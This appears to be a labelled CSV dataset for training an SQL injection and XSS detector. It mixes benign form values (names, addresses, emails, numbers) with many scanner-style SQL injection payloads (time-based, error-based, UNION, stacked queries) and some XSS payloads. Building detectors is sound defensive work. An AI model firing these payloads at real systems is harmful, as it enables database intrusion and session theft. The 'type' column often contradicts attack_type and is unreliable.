Text,attack_type,Label,type
"1"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""nkgd""=""nkgd",sqli,1,sql
shubaly,norm,0,normal
"1%""))) rlike sleep(5) and (((""%""=""",sqli,1,normal
hawi,norm,0,normal
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
estreptoccico,norm,0,normal
sant esteve sesrovires,norm,0,normal
r8cid0va,norm,0,normal
47131,norm,0,normal
"""javascript:alert(1)""><input type=submit>",xss,2,xss
tonicidad,norm,0,normal
8191154734544513,norm,0,normal
96244363n,norm,0,normal
"calle santa corda, 84, 3?h",norm,0,normal
israel_piggot@joyclub.pe,norm,0,normal
tucker.faulkner@clichotel.ck,norm,0,normal
12772631h,norm,0,normal
"-1891' in boolean mode) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",sqli,1,sql
4244,norm,0,normal
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""ewsr"" like ""ewsr",sqli,1,sql
"1"")) as dvpb where 6673=6673;select * from generate_series(6730,6730,case when (6730=9431) then 1 else 0 end) limit 1--",sqli,1,sql
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",sqli,1,sql
"-1408)) union all select 5715,5715,5715,5715,5715,5715--",sqli,1,sql
"-7016%"")) union all select 8847,8847,8847--",sqli,1,sql
"-4355""))) or 9323=9323#",sqli,1,normal
trauberg_lion@viscotek.pl,norm,0,normal
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq",sqli,1,normal
zenaires,norm,0,normal
"-1196"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""srlq""=""srlq",sqli,1,sql
"zapata, s/n",norm,0,normal
25g0a00,norm,0,normal
clavel_keegan@apelton.gy,norm,0,normal
"1' where 5786=5786 and elt(1210=1210,sleep(5))--",sqli,1,sql
ulric,norm,0,normal
"plaza de el salvador 91,",norm,0,normal
9raspun9e,norm,0,normal
salce@masqueclases.tg,norm,0,normal
"1)) as wezj where 2869=2869 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
jugen,norm,0,normal
19804746k,norm,0,normal
29639,norm,0,normal
tefilo,norm,0,normal
7785,norm,0,normal
41710,norm,0,normal
c/ trujillo 155 4?g,norm,0,normal
4277353398050908,norm,0,normal
"1')) as fwxq where 9935=9935 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
"1%')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('%'='",sqli,1,sql
josy,norm,0,normal
weiner,norm,0,normal
4844031303966042,norm,0,normal
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",sqli,1,sql
tabanera de cerrato,norm,0,normal
"1"") as lrew where 6067=6067 union all select null,null,null,null,null,null,null#",sqli,1,sql
1' where 4115=4115;select (case when (2501=4688) then 2501 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",sqli,1,sql
raja villalba,norm,0,normal
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""jcgh""=""jcgh",sqli,1,sql
"1%"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""%""=""",sqli,1,sql
m1n*6848,norm,0,normal
"1"")) as iqgd where 7611=7611 union all select null,null,null,null,null#",sqli,1,sql
walpole@magentalgtb.zw,norm,0,normal
<b><script<b></b><alert(1)</script </b></b>,xss,2,normal
rosilda,norm,0,normal
"plaza luis pombo, s/n 9?g",norm,0,normal
"1'||(select 'kojx' from dual where 8140=8140 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,sql
ax,norm,0,normal
erfani,norm,0,normal
4056lan0e,norm,0,normal
pente@maxitienda.ms,norm,0,normal
"(updatexml(8862,concat(0x2e,0x7171706a71,(select (elt(8862=8862,1))),0x717a767a71),8981))",sqli,1,sql
jaazael,norm,0,normal
"1"") as dien where 4022=4022;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
sant mori,norm,0,normal
"calle cerrada, 94,",norm,0,normal
sonriente,norm,0,normal
mantela-do,norm,0,normal
1capa2ad*or,norm,0,normal
llombai,norm,0,normal
1166,norm,0,normal
barbar ocaranza,norm,0,normal
1')) as kdse where 6767=6767 rlike sleep(5)#,sqli,1,normal
"1"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""ponv""=""ponv",sqli,1,sql
sidonio,norm,0,normal
"1') as viex where 6242=6242 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
pleitas,norm,0,normal
virge,norm,0,normal
"c/ merced, 23, 3d",norm,0,normal
michele6,norm,0,normal
whisler,norm,0,normal
3andador4,norm,0,normal
guaza de campos,norm,0,normal
"c/ arquitecto hernandez rubio, 101, 1h",norm,0,normal
1381,norm,0,normal
madriles hernandez,norm,0,normal
"1"" where 5796=5796 and sleep(5)#",sqli,1,normal
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",sqli,1,sql
"c/ la miraculosa, 147",norm,0,normal
stephen,norm,0,normal
muniello llubet,norm,0,normal
steelsmith@7peines.com,norm,0,normal
"1' where 9994=9994 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1') as sjzi where 8242=8242 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
bannerman@nevadahispanica.aq,norm,0,normal
"-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",sqli,1,sql
57rsant2541,norm,0,normal
"-2207%')) union all select 3339,3339,3339,3339,3339,3339#",sqli,1,sql
22361,norm,0,normal
0269447503610316,norm,0,normal
"1"")) as zemm where 3324=3324 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (4557=4557",sqli,1,sql
2095,norm,0,normal
19262,norm,0,normal
4330170884223124,norm,0,normal
"1"" and elt(4249=4249,7259)",sqli,1,normal
02345,norm,0,normal
"1')) union all select null,null,null,null,null--",sqli,1,sql
"1') or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",sqli,1,sql
1)) as zldh where 3302=3302 rlike (select (case when (1481=5677) then 1 else 0x28 end))--,sqli,1,sql
akatuka cunil,norm,0,normal
43558,norm,0,normal
5425376979126339,norm,0,normal
635l82rab74id35,norm,0,normal
1980,norm,0,normal
ac40cent0,norm,0,normal
4676154156546858,norm,0,normal
teulinks-oakman@941.tr,norm,0,normal
ronen,norm,0,normal
stiven,norm,0,normal
kostka5@institutoandaluzdelmar.an,norm,0,normal
4984,norm,0,normal
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
6040,norm,0,normal
229669a3a,norm,0,normal
almadrones,norm,0,normal
branchadell arribas,norm,0,normal
p41did3m31te,norm,0,normal
dearly@evelin.ge,norm,0,normal
obed9e3cia0,norm,0,normal
"-8684 union all select 9519,9519,9519,9519--",sqli,1,sql
"sayago, 156,",norm,0,normal
89vi3o58,norm,0,normal
"c/ garcia mosquera, 184,",norm,0,normal
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')",sqli,1,sql
1' and (select * from (select(sleep(5)))fzno),sqli,1,sql
dordas berttony,norm,0,normal
1'));begin user_lock.sleep(5); end and (('vcaf' like 'vcaf,sqli,1,sql
o'kinghtons camarena,norm,0,normal
elia6,norm,0,normal
-3978 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- mtun,sqli,1,sql
prussel@mataluenga.co,norm,0,normal
"-3729')) or elt(4482=2648,2648) and (('vkkr' like 'vkkr",sqli,1,normal
"1"") as ybkp where 7788=7788 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"1))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((9802=9802",sqli,1,sql
49240,norm,0,normal
1524943090962502,norm,0,normal
"1%"") and elt(3114=3114,sleep(5))#",sqli,1,normal
45674,norm,0,normal
cocina_r,norm,0,normal
0131468635735450,norm,0,normal
8704361418019051,norm,0,normal
-1<script>document.cookie=true;//<</script>,xss,2,xss
mara,norm,0,normal
nataln,norm,0,normal
-8131')) or 9680=3467,sqli,1,normal
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('wcmt'='wcmt",sqli,1,normal
dove3@enla.nc,norm,0,normal
"1%"");select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
selene,norm,0,normal
1 and (3020=3020)*6703-- zsnl,sqli,1,sql
"1"") where 3958=3958 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
05130,norm,0,normal
passatge arago 107,norm,0,normal
thomasia,norm,0,normal
l8ci7ic55,norm,0,normal
yebra de basa,norm,0,normal
"antonio toledano, 78, 10?h",norm,0,normal
1')) as grne where 9003=9003 order by 1--,sqli,1,sql
1 where 3357=3357 and (9492=4334)*4334--,sqli,1,sql
"<table background=""javascript:document.cookie=true;"">",xss,2,xss
scely_prono@tobarisch.de,norm,0,normal
"calle sant domenec, 71,",norm,0,normal
wookie,norm,0,normal
04510,norm,0,normal
02838,norm,0,normal
solanillos del extremo,norm,0,normal
27113,norm,0,normal
1') and 7533=7533,sqli,1,normal
"-5825) as mflf where 3999=3999 or make_set(1492=7153,7153)--",sqli,1,sql
"1') as vlwh where 9403=9403 or elt(5873=5873,sleep(5))#",sqli,1,normal
7781,norm,0,normal
"1""))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",sqli,1,sql
40142181m,norm,0,normal
1') as jrqh where 6204=6204 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
"1%""))) or elt(5873=5873,sleep(5))#",sqli,1,normal
"pobla de claramunt, la",norm,0,normal
1354790764282660,norm,0,normal
1')) as jbcd where 9078=9078 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
graff@manzanilladevillafafila.iq,norm,0,normal
derbyshi,norm,0,normal
ferrandez cabaas,norm,0,normal
1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
a8errad1r,norm,0,normal
ericsson,norm,0,normal
"1%"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""%""=""",sqli,1,sql
1) as wiyx where 6515=6515;select case when 7717=7717 then 1 else null end--,sqli,1,sql
virgilia,norm,0,normal
vilar elsegui,norm,0,normal
"1 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
magnin_arne@tiebreak.com.sr,norm,0,normal
c/ cuenca s/n,norm,0,normal
melcocha,norm,0,normal
08686877f,norm,0,normal
"1"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""imlx""=""imlx",sqli,1,sql
"1"") as nixg where 4580=4580 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
0945727443543584,norm,0,normal
barby,norm,0,normal
rodobaldo,norm,0,normal
malcolm,norm,0,normal
gianna,norm,0,normal
p81i4uer3o,norm,0,normal
dehoff,norm,0,normal
es518l132n,norm,0,normal
5956754565750791,norm,0,normal
9173442177715818,norm,0,normal
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
cybotech,norm,0,normal
ch61c795,norm,0,normal
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('vfxg' like 'vfxg",sqli,1,sql
villarramiel,norm,0,normal
"-5744) union all select 3617,3617,3617,3617,3617,3617--",sqli,1,sql
astor,norm,0,normal
94409893e,norm,0,normal
8789249856609623,norm,0,normal
throne@familiamarino.cl,norm,0,normal
"1%"";if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
"1%')) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
pancho cossio 69 4?h,norm,0,normal
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",sqli,1,sql
"-1588%""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
1'||(select 'abjv' from dual where 4200=4200;begin dbms_lock.sleep(5); end)||',sqli,1,sql
4411352716208406,norm,0,normal
leira johe,norm,0,normal
"<table><td background=""javascript:document.cookie=true;"">",xss,2,xss
yazmn,norm,0,normal
-5962)) as jbqv where 2583=2583 or 7496=8560--,sqli,1,sql
"1) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
sureda bahamonde,norm,0,normal
7449583219109875,norm,0,normal
couto capellades,norm,0,normal
"1'+(select 'cstd' where 9326=9326 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'",sqli,1,sql
"1%""))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
2485308810386739,norm,0,normal
07077546d,norm,0,normal
caruth5@wave.com.pt,norm,0,normal
choon-li,norm,0,normal
"-6595"" order by 1--",sqli,1,sql
oury_boskovic8@faders.com.tv,norm,0,normal
0890605650691584,norm,0,normal
azanuy-alins,norm,0,normal
calcinable,norm,0,normal
44213,norm,0,normal
"avda. somosaguas 150, 1?b",norm,0,normal
ip50,norm,0,normal
"1',(case when 5204=2136 then 1 else null end)",sqli,1,normal
01449063v,norm,0,normal
6569,norm,0,normal
"-4028) where 3244=3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",sqli,1,sql
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('rpof' like 'rpof",sqli,1,sql
"1"") as rovd where 3764=3764 and elt(4249=4249,7259)--",sqli,1,sql
"calle escultor abrahan cardenes 162,",norm,0,normal
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
fustukian@comercioenlacalle.tf,norm,0,normal
miyashita@connect.sm,norm,0,normal
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
"1"" where 2642=2642 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
sempere,norm,0,normal
09246,norm,0,normal
44369,norm,0,normal
inch.livermore@zing.es,norm,0,normal
16315,norm,0,normal
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,normal
68170319k,norm,0,normal
9751,norm,0,normal
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
raju,norm,0,normal
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi,sqli,1,sql
salva carol,norm,0,normal
"1"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""qycx"" like ""qycx",sqli,1,sql
"1"") where 2873=2873 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
01r1f9co,norm,0,normal
gil,norm,0,normal
braian,norm,0,normal
1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--,sqli,1,sql
1%') and 7533=7533 and ('%'=',sqli,1,normal
2278515903267835,norm,0,normal
oliver@weat.gm,norm,0,normal
polvoraduque,norm,0,normal
"-2190') where 8890=8890 union all select 8890,8890#",sqli,1,sql
"1') where 6214=6214 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
28045405x,norm,0,normal
tal,norm,0,normal
4o4d3nero,norm,0,normal
enumer24,norm,0,normal
miremont@barnicesuv.th,norm,0,normal
"1'+(select 'tyuz' where 3957=3957 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))+'",sqli,1,sql
patrica0,norm,0,normal
"avenida democracia, 106 4?g",norm,0,normal
almazn cayul,norm,0,normal
1;select sleep(5)-- waln,sqli,1,sql
81,norm,0,normal
76156835v,norm,0,normal
"1) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""cgps"" like ""cgps",sqli,1,sql
"1;select benchmark(5000000,md5(0x4c4d6142))# idxq",sqli,1,sql
frydtberg@archivodeimagenes.cat,norm,0,normal
delbret,norm,0,normal
"1"" where 7232=7232 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
"1,(select (case when (5726=5275) then 1 else 1/(select 0) end))",sqli,1,sql
1')) as mqnv where 9831=9831;select (case when (4994=1572) then 4994 else 4994*(select 4994 from mysql.db) end)#,sqli,1,sql
"eliana, l'",norm,0,normal
"1))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((8382=8382",sqli,1,sql
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""cxsu"" like ""cxsu",sqli,1,sql
juneho,norm,0,normal
"-5963"" or 9323=9323#",sqli,1,normal
yunquera de henares,norm,0,normal
tridente,norm,0,normal
gonzale.katsuno@viajesparamujeres.tc,norm,0,normal
17621392b,norm,0,normal
17493,norm,0,normal
recerdo,norm,0,normal
heldo,norm,0,normal
6vencea,norm,0,normal
ca?seosa,norm,0,normal
6351981280005819,norm,0,normal
wolfs,norm,0,normal
mcmann,norm,0,normal
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""tbdl"" like ""tbdl",sqli,1,sql
00903443a,norm,0,normal
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('subq' like 'subq",sqli,1,normal
34igant0d9,norm,0,normal
11203636z,norm,0,normal
"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
hoeflich@movil-google.cx,norm,0,normal
1649358114502057,norm,0,normal
polopos,norm,0,normal
kawas kercooff,norm,0,normal
"<br size=""&{alert('xss')}"">",xss,2,normal
guiomar,norm,0,normal
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (3770=3770",sqli,1,sql
"c/ portalegre 43,",norm,0,normal
retocador,norm,0,normal
"-4194""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ddbc"" like ""ddbc",sqli,1,sql
10630,norm,0,normal
bicelis caldern,norm,0,normal
"c/ los mimbres, 31",norm,0,normal
mcarthur,norm,0,normal
"1"") or elt(6272=6272,sleep(5)) and (""dplf"" like ""dplf",sqli,1,normal
5592414895500154,norm,0,normal
"-8053"" where 5458=5458 or 9323=9323#",sqli,1,normal
"-3411'))) union all select 3185,3185,3185,3185,3185,3185,3185,3185--",sqli,1,sql
44368,norm,0,normal
24142,norm,0,normal
44132,norm,0,normal
"1'||(select 'zpwe' from dual where 7743=7743 union all select null,null#",sqli,1,sql
hoefer.tabuyo@gopersonalfitness.nz,norm,0,normal
"-8557 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
0urifica2er0,norm,0,normal
"c/ sicilia, 162,",norm,0,normal
es9a5raga7o,norm,0,normal
kotler,norm,0,normal
"1"") as uyns where 4751=4751 and (select * from (select(sleep(5)))fzno)--",sqli,1,sql
"1%') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('%'='",sqli,1,sql
fontaine@viajesdacapalla.gd,norm,0,normal
"1"") and (select * from (select(sleep(5)))fzno) and (""ppml""=""ppml",sqli,1,sql
"1%"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1)) as acni where 6355=6355 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
42583172y,norm,0,normal
logan,norm,0,normal
alfio,norm,0,normal
72932222g,norm,0,normal
"1"" where 5517=5517 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
s074ido3,norm,0,normal
"1%""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""%""=""",sqli,1,normal
toro,norm,0,normal
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",sqli,1,normal
"1' where 3339=3339 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('vpus'='vpus",sqli,1,sql
escalera,norm,0,normal
drozdek.waechter@tarifasdevuelos.bj,norm,0,normal
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('xdui' like 'xdui",sqli,1,sql
ellston balladares,norm,0,normal
pericak,norm,0,normal
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('pwuy'='pwuy",sqli,1,sql
"1' in boolean mode) union all select null,null,null,null,null#",sqli,1,sql
"1"" union all select null,null,null,null--",sqli,1,sql
marangosoff@sigloventidos.cl,norm,0,normal
3154021344584169,norm,0,normal
"1')) as efmy where 7299=7299 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",sqli,1,sql
"calle carmelo torres, 102",norm,0,normal
"<crosssitescripting style=""crosssitescripting:expression(alert('crosssitescripting'))""> exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*""); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(""crosssitescripting""))'>",xss,2,sql
1')));waitfor delay '0:0:5' and ((('hrta'='hrta,sqli,1,sql
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((1105=1105",sqli,1,sql
perales salmern,norm,0,normal
karattup,norm,0,normal
68438440p,norm,0,normal
46700,norm,0,normal
1%' and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
"1'||(select 'ativ' from dual where 4746=4746 union all select null,null,null,null#",sqli,1,sql
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd",sqli,1,sql
"1) as zhvx where 3171=3171 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
illarraga,norm,0,normal
1'+(select 'rpds' where 5870=5870 and 4595=4595#,sqli,1,sql
sintes gasd,norm,0,normal
37891,norm,0,normal
"1%'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('%'='",sqli,1,normal
salvilla@mtos.pr,norm,0,normal
"1)) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((9542=9542",sqli,1,normal
escasamente,norm,0,normal
"1%"")) and elt(4249=4249,7259) and ((""%""=""",sqli,1,normal
0902736891037031,norm,0,normal
cele959n3s0o,norm,0,normal
"1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('cgou' like 'cgou",sqli,1,sql
"1%') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
9380,norm,0,normal
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",sqli,1,sql
"de la coma, 112 4-b",norm,0,normal
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('khah' like 'khah",sqli,1,sql
"-8203"") union all select 6394,6394,6394,6394,6394--",sqli,1,sql
morek,norm,0,normal
1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--,sqli,1,sql
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,sql
"1') where 2443=2443 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
ayar,norm,0,normal
05350,norm,0,normal
pozal de gallinas,norm,0,normal
jaaziel,norm,0,normal
"1"")) as oiqr where 4073=4073 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
08980,norm,0,normal
"1"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
vilcu-verschuer@eddydaniele.kz,norm,0,normal
